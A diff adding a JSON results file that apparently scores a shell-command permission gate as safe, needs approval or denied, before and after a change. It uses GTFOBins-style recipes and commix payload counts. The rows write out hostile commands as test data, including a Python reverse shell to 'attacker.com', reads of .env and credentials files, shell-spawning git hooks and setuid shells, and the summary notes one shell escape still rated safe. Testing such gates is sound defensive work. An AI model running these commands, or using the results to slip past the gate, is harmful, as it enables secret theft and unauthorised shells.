@@ -1,0 +1,650 @@
+{
+  "summary": {
+    "recipes": 75,
+    "before": {
+      "safe": 11,
+      "needs_approval": 41,
+      "denied": 23
+    },
+    "after": {
+      "safe": 1,
+      "needs_approval": 29,
+      "denied": 45
+    },
+    "safe_before_by_function": {
+      "file-write": 1,
+      "inherit": 3,
+      "shell": 4,
+      "library-load": 1,
+      "reverse-shell": 1,
+      "upload": 1
+    },
+    "still_safe_after": [
+      {
+        "program": "git",
+        "function": "inherit",
+        "variant": "as_written",
+        "command": "!/bin/sh",
+        "before": "safe",
+        "after": "safe"
+      }
+    ],
+    "commix": {
+      "payloads": 8262,
+      "alone": {
+        "floor_safe_before": 3346,
+        "floor_safe_after": 3346
+      },
+      "after_ls": {
+        "floor_safe_before": 3346,
+        "floor_safe_after": 3346
+      },
+      "after_ls_nospace": {
+        "floor_safe_before": 3346,
+        "floor_safe_after": 3346
+      }
+    }
+  },
+  "rows": [
+    {
+      "program": "cat",
+      "function": "file-read",
+      "variant": "canary_absolute",
+      "command": "cat C:/h/secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "cat",
+      "function": "file-read",
+      "variant": "relative_secret_name",
+      "command": "cat credentials.json",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "cat",
+      "function": "file-read",
+      "variant": "dotenv",
+      "command": "cat .env",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "cat",
+      "function": "file-read",
+      "variant": "parent_traversal",
+      "command": "cat ../secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "date",
+      "function": "file-read",
+      "variant": "canary_absolute",
+      "command": "date -f C:/h/secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "date",
+      "function": "file-read",
+      "variant": "relative_secret_name",
+      "command": "date -f credentials.json",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "date",
+      "function": "file-read",
+      "variant": "dotenv",
+      "command": "date -f .env",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "date",
+      "function": "file-read",
+      "variant": "parent_traversal",
+      "command": "date -f ../secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "file",
+      "function": "file-read",
+      "variant": "canary_absolute",
+      "command": "file -f C:/h/secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "file",
+      "function": "file-read",
+      "variant": "relative_secret_name",
+      "command": "file -f credentials.json",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "file",
+      "function": "file-read",
+      "variant": "dotenv",
+      "command": "file -f .env",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "file",
+      "function": "file-read",
+      "variant": "parent_traversal",
+      "command": "file -f ../secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "file",
+      "function": "file-read",
+      "variant": "canary_absolute",
+      "command": "file -m C:/h/secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "file",
+      "function": "file-read",
+      "variant": "relative_secret_name",
+      "command": "file -m credentials.json",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "file",
+      "function": "file-read",
+      "variant": "dotenv",
+      "command": "file -m .env",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "file",
+      "function": "file-read",
+      "variant": "parent_traversal",
+      "command": "file -m ../secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "git",
+      "function": "file-read",
+      "variant": "canary_absolute",
+      "command": "git diff /dev/null C:/h/secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "git",
+      "function": "file-read",
+      "variant": "relative_secret_name",
+      "command": "git diff /dev/null credentials.json",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "git",
+      "function": "file-read",
+      "variant": "dotenv",
+      "command": "git diff /dev/null .env",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "git",
+      "function": "file-read",
+      "variant": "parent_traversal",
+      "command": "git diff /dev/null ../secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "git",
+      "function": "file-write",
+      "variant": "as_written",
+      "command": "git apply --unsafe-paths --directory / x.patch",
+      "before": "safe",
+      "after": "needs_approval"
+    },
+    {
+      "program": "git",
+      "function": "inherit",
+      "variant": "as_written",
+      "command": "git help config",
+      "before": "safe",
+      "after": "needs_approval"
+    },
+    {
+      "program": "git",
+      "function": "inherit",
+      "variant": "as_written",
+      "command": "git branch --help config",
+      "before": "safe",
+      "after": "needs_approval"
+    },
+    {
+      "program": "git",
+      "function": "inherit",
+      "variant": "as_written",
+      "command": "!/bin/sh",
+      "before": "safe",
+      "after": "safe"
+    },
+    {
+      "program": "git",
+      "function": "shell",
+      "variant": "as_written",
+      "command": "PAGER='/bin/sh -c \"exec sh 0<&1\"' git -p help",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "git",
+      "function": "shell",
+      "variant": "as_written",
+      "command": "git init .",
+      "before": "safe",
+      "after": "needs_approval"
+    },
+    {
+      "program": "git",
+      "function": "shell",
+      "variant": "as_written",
+      "command": "echo 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "git",
+      "function": "shell",
+      "variant": "as_written",
+      "command": "chmod +x .git/hooks/pre-commit",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "git",
+      "function": "shell",
+      "variant": "as_written",
+      "command": "git -C . commit --allow-empty -m x",
+      "before": "safe",
+      "after": "needs_approval"
+    },
+    {
+      "program": "git",
+      "function": "shell",
+      "variant": "as_written",
+      "command": "ln -s /bin/sh git-x",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "git",
+      "function": "shell",
+      "variant": "as_written",
+      "command": "git --exec-path=. x",
+      "before": "safe",
+      "after": "needs_approval"
+    },
+    {
+      "program": "git",
+      "function": "shell",
+      "variant": "as_written",
+      "command": "ln -s /bin/sh git-x",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "git",
+      "function": "shell",
+      "variant": "as_written",
+      "command": "git --exec-path=. x -p",
+      "before": "safe",
+      "after": "needs_approval"
+    },
+    {
+      "program": "grep",
+      "function": "file-read",
+      "variant": "canary_absolute",
+      "command": "grep '' C:/h/secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "grep",
+      "function": "file-read",
+      "variant": "relative_secret_name",
+      "command": "grep '' credentials.json",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "grep",
+      "function": "file-read",
+      "variant": "dotenv",
+      "command": "grep '' .env",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "grep",
+      "function": "file-read",
+      "variant": "parent_traversal",
+      "command": "grep '' ../secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "head",
+      "function": "file-read",
+      "variant": "canary_absolute",
+      "command": "head -c-0 C:/h/secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "head",
+      "function": "file-read",
+      "variant": "relative_secret_name",
+      "command": "head -c-0 credentials.json",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "head",
+      "function": "file-read",
+      "variant": "dotenv",
+      "command": "head -c-0 .env",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "head",
+      "function": "file-read",
+      "variant": "parent_traversal",
+      "command": "head -c-0 ../secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "pip",
+      "function": "inherit",
+      "variant": "as_written",
+      "command": "echo '...' >setup.py",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "pip",
+      "function": "inherit",
+      "variant": "as_written",
+      "command": "pip install --break-system-packages .",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "pip",
+      "function": "shell",
+      "variant": "as_written",
+      "command": "pip config --editor '/bin/sh -s' edit",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "python",
+      "function": "download",
+      "variant": "canary_absolute",
+      "command": "python -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.url",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "python",
+      "function": "download",
+      "variant": "relative_secret_name",
+      "command": "python -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.url",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "python",
+      "function": "download",
+      "variant": "dotenv",
+      "command": "python -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.url",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "python",
+      "function": "download",
+      "variant": "parent_traversal",
+      "command": "python -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.url",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "python",
+      "function": "file-read",
+      "variant": "canary_absolute",
+      "command": "python -c 'print(open(\"C:/h/secret.txt\").read())'",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "python",
+      "function": "file-read",
+      "variant": "relative_secret_name",
+      "command": "python -c 'print(open(\"credentials.json\").read())'",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "python",
+      "function": "file-read",
+      "variant": "dotenv",
+      "command": "python -c 'print(open(\".env\").read())'",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "python",
+      "function": "file-read",
+      "variant": "parent_traversal",
+      "command": "python -c 'print(open(\"../secret.txt\").read())'",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "python",
+      "function": "file-write",
+      "variant": "canary_absolute",
+      "command": "python -c 'open(\"C:/h/out.txt\",\"w+\").write(\"DATA\")'",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "python",
+      "function": "file-write",
+      "variant": "relative_secret_name",
+      "command": "python -c 'open(\"C:/h/out.txt\",\"w+\").write(\"DATA\")'",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "python",
+      "function": "file-write",
+      "variant": "dotenv",
+      "command": "python -c 'open(\"C:/h/out.txt\",\"w+\").write(\"DATA\")'",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "python",
+      "function": "file-write",
+      "variant": "parent_traversal",
+      "command": "python -c 'open(\"C:/h/out.txt\",\"w+\").write(\"DATA\")'",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "python",
+      "function": "library-load",
+      "variant": "as_written",
+      "command": "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"/path/to/lib.so\")'",
+      "before": "safe",
+      "after": "needs_approval"
+    },
+    {
+      "program": "python",
+      "function": "reverse-shell",
+      "variant": "as_written",
+      "command": "python -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((\"attacker.com\",12345))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "python",
+      "function": "reverse-shell",
+      "variant": "as_written",
+      "command": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345",
+      "before": "safe",
+      "after": "needs_approval"
+    },
+    {
+      "program": "python",
+      "function": "shell",
+      "variant": "as_written",
+      "command": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\")'",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "python",
+      "function": "shell",
+      "variant": "as_written",
+      "command": "python -c 'import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\")'",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "python",
+      "function": "shell",
+      "variant": "as_written",
+      "command": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "python",
+      "function": "upload",
+      "variant": "canary_absolute",
+      "command": "python -c 'import sys\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "python",
+      "function": "upload",
+      "variant": "relative_secret_name",
+      "command": "python -c 'import sys\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "python",
+      "function": "upload",
+      "variant": "dotenv",
+      "command": "python -c 'import sys\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "python",
+      "function": "upload",
+      "variant": "parent_traversal",
+      "command": "python -c 'import sys\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr",
+      "before": "needs_approval",
+      "after": "needs_approval"
+    },
+    {
+      "program": "python",
+      "function": "upload",
+      "variant": "as_written",
+      "command": "python -c 'import sys\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, Socket",
+      "before": "safe",
+      "after": "needs_approval"
+    },
+    {
+      "program": "tail",
+      "function": "file-read",
+      "variant": "canary_absolute",
+      "command": "tail -c+0 C:/h/secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "tail",
+      "function": "file-read",
+      "variant": "relative_secret_name",
+      "command": "tail -c+0 credentials.json",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "tail",
+      "function": "file-read",
+      "variant": "dotenv",
+      "command": "tail -c+0 .env",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "tail",
+      "function": "file-read",
+      "variant": "parent_traversal",
+      "command": "tail -c+0 ../secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "wc",
+      "function": "file-read",
+      "variant": "canary_absolute",
+      "command": "wc --files0-from C:/h/secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    },
+    {
+      "program": "wc",
+      "function": "file-read",
+      "variant": "relative_secret_name",
+      "command": "wc --files0-from credentials.json",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "wc",
+      "function": "file-read",
+      "variant": "dotenv",
+      "command": "wc --files0-from .env",
+      "before": "denied",
+      "after": "denied"
+    },
+    {
+      "program": "wc",
+      "function": "file-read",
+      "variant": "parent_traversal",
+      "command": "wc --files0-from ../secret.txt",
+      "before": "needs_approval",
+      "after": "denied"
+    }
+  ]
+}
